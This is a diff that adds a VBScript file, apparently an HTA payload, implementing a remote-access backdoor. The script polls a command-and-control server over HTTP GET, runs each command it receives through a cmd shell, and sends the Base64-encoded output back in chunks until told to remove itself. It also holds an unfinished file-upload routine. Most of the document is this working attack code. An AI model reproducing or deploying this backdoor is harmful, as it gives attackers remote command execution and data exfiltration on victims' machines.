@@ -1,0 +1,175 @@
+
+
+' GET Maximum size (must be a multiple of 4!)
+GET_MAX_SIZE = 800
+
+' Scripting.FileSystemObject   [NO]
+
+' Upload function WIP (not fully working yet)
+Public Sub WriteFile(byval data, byval name)
+    set fso = CreateObject("Scripting.FileSystemObject")
+    Set ts = fso.createTextFile(name)
+    ts.Write(data)
+    ts.Close
+End Sub
+
+' Base64 management functions
+base64codes = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+
+Function toUTF8(ByRef str,ByRef size)
+    ReDim res(Len(str)*3)
+    k=1
+    For i = 1 To Len(str)
+        ch = (AscW(Mid(str, i, 1))+65536) And 65535
+        If (ch < 128) Then
+            res(k) = ch
+            k=k+1
+        Else If (ch < 2048) Then
+                res(k) = 192 Or int(ch/64)
+                res(k+1) = 128 Or (ch And 63)
+                k=k+2
+            Else
+                res(k) = 224 Or (int(ch/4096) And 15)
+                res(k+1) = 128 Or (int(ch/64) And 63)
+                res(k+2)  = 128 Or (ch And 63)
+                k=k+3
+            End If
+        End If
+    Next
+    size = k
+    toUTF8 = res
+End Function
+
+
+Public Function Base64Decode(byVal strIn)
+    Dim strOut,old
+    For n=1 to Len(strIn)
+        k = ((n-1) And 3)
+        bit=4^k
+        val=InStr(base64codes,Mid(strIn,n,1))-1
+        if k>0 then strOut=strOut+Chr(((old*bit+Int((val*bit)/64)) And 255))
+        old=val
+    Next
+    Base64Decode = strOut
+End Function
+
+
+Public Function Base64Encode(byVal strIn,ByVal special)
+    n=1
+    cur=0
+    strOut=""
+    data=toUTF8(strIn,size)
+    For i = 1 To size
+        c=data(i)
+        if (c>=0) Then
+            k = (n-1) Mod 3
+            bit = 4^(k+1)
+            cur = cur + Int(c/bit)
+            nex = int(((c And (bit-1))*64)/bit)
+            strOut=strOut+Mid(base64codes,cur+1,1)
+            if k=2 or i=size Then strOut=strOut+Mid(base64codes,nex+1,1):nex=0
+            cur=nex
+            n=n+1
+        End If
+    Next
+    if special then strOut=replace(strOut,"+","_")
+    Base64Encode = strOut
+End Function
+
+
+' First path is current path
+cd = "."
+command = ""
+contents = ""
+cmdcount = 0
+Dim cmdres()
+Dim commands()    ' FIFO array
+Dim binaryStream
+while InStr(command,"remove")=0    
+
+    ' if there's (at least) a new command and the buffer is empty run it
+    if cmdcount>0 And Len(Contents)=0 then
+    
+        ' Remove the command from FIFO array
+        command=commands(1)
+        cmdcount=cmdcount-1
+        For x=1 To cmdcount:commands(x)=commands(x+1):Next
+        ReDim Preserve commands(cmdcount)
+
+        ' Open CMD session
+        set ws = CreateObject("WScript.Shell")
+        set cmd = ws.Exec("cmd /K")
+
+        ' Move to the current path
+        cmd.stdin.writeline("cd "&cd)
+
+        ' Exec command
+        cmd.stdin.writeline(command)
+
+        ' Check current path
+        cmd.stdin.writeline("cd")
+        cmd.stdin.close
+
+        ' Load all output lines
+        cnt = 0
+        while not cmd.stdout.AtEndOfStream
+            res = cmd.stdout.ReadLine
+            ReDim Preserve cmdres(cnt)
+            cmdres(cnt) = res
+            cnt=cnt+1
+        wend
+
+        ' Extract command output
+        i=3
+        contents=""
+        while (i<cnt-4)
+            if i>3 then contents = contents & VbCrLf
+            contents = contents & cmdres(i)
+            i=i+1
+        wend
+
+        ' Keep track of current path
+        cd = cmdres(cnt-3)
+
+        ' Build up contents so that it looks like a real cmd session
+        curpath = replace(cmdres(cnt-4),">cd",">")
+        contents = Base64Encode(contents & VbCrLf & curpath,true)+"*"
+    end if
+
+    ' Send packetized contents to C2 site using GET and retrieve next command
+    On Error Resume Next
+    With CreateObject("MSXML2.XMLHTTP")
+        .open "GET", "http://"&IP&":"&port&"/?arg=" & Mid(contents,1,GET_MAX_SIZE), False
+        .send
+        if (err.number=0) then
+            contents=Mid(contents,GET_MAX_SIZE+1)        
+            nextcmd=.responseText
+            if nextcmd<>"" then 
+                cmdcount=cmdcount+1
+                ReDim Preserve commands(cmdcount)
+                commands(cmdcount) = nextcmd
+            end if
+        end if
+    End With
+    On Error Goto 0
+
+wend
+
+' Upload management (WIP)
+'if InStr(command,"__BASE64__")<>0 then
+'   ' Gestione upload
+'   data = Mid(command,11)
+'   cnt = InStr(data,"__ENDNAME__")
+'   if (cnt>1) then
+'        name = Left(data,cnt-1)
+'        data = Mid(data,cnt+11)
+'        bytes = Base64Decode(data)
+'        WriteFile bytes ,cd & "\" & name
+'        contents = Base64Encode(VbCrLf & "Uploaded " & name & VbCrLf,true)
+'    else
+'        contents = Base64Encode(VbCrLf & "Empty name" & VbCrLf,true)
+'    end if            
+'else    
+
+self.close
+</script>
